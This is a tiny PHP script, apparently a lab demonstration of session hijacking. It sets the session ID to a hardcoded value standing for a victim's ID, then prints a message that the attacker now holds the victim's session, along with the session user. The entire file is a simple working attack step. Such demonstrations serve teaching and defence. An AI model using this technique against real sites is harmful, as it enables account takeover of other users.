<?php
session_id("your-user-id"); // Change Session id value
session_start();
?>

<h2>Attacker has victim's session now!</h2>
<p>Session ID in use: <?php echo session_id(); ?></p>
<p>User: <?php echo $_SESSION['user'] ?? 'Not set'; ?></p>
